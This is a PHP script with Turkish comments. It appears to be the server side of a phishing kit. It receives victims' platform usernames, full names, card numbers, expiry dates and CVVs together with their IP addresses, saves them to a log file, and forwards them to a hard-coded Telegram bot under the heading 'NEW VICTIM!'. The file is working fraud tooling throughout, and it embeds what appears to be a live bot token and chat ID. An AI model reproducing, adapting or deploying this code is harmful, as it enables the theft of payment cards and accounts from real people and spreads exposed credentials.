<?php
// ============================================
// TELEGRAM BOT AYARLARI
// ============================================
define('TELEGRAM_BOT_TOKEN', '8522279955:AAFwA7uILD8zkzrxcjXjazc5guzSm1cFI5k');
define('TELEGRAM_CHAT_ID', '6063727392');
// ============================================

header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'Veri alınamadı']);
    exit;
}

// IP adresini al
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Proxy/Cloudflare desteği
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

// Veriye ek bilgiler ekle
$data['ip'] = $ip;
$data['user_agent'] = $user_agent;
$data['timestamp'] = $timestamp;

// ============================================
// 1. DOSYAYA KAYDET (yedek)
// ============================================
$log_file = __DIR__ . '/logs.txt';
$existing_data = [];

if (file_exists($log_file)) {
    $content = file_get_contents($log_file);
    if (!empty($content)) {
        $existing_data = json_decode($content, true) ?? [];
    }
}

$existing_data[] = $data;
file_put_contents($log_file, json_encode($existing_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ============================================
// 2. TELEGRAM'A BİLDİRİM GÖNDER
// ============================================
if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    $message = "🚨 <b>YENİ KURBAN!</b>\n\n";
    
    if (isset($data['platform'])) {
        $message .= "📱 <b>Platform:</b> " . htmlspecialchars($data['platform']) . "\n";
    }
    
    if (isset($data['username'])) {
        $message .= "👤 <b>Kullanıcı:</b> @" . htmlspecialchars($data['username']) . "\n";
    }
    
    if (isset($data['fullname'])) {
        $message .= "📛 <b>Ad Soyad:</b> " . htmlspecialchars($data['fullname']) . "\n";
    }
    
    if (isset($data['cardnumber'])) {
        $message .= "💳 <b>Kart No:</b> <code>" . htmlspecialchars($data['cardnumber']) . "</code>\n";
    }
    
    if (isset($data['expiry'])) {
        $message .= "📅 <b>SKT:</b> " . htmlspecialchars($data['expiry']) . "\n";
    }
    
    if (isset($data['cvv'])) {
        $message .= "🔐 <b>CVV:</b> " . htmlspecialchars($data['cvv']) . "\n";
    }
    
    $message .= "\n🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
    $message .= "⏰ <b>Tarih:</b> " . $timestamp;
    
    $telegram_url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $telegram_data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

echo json_encode(['status' => 'success']);
?>
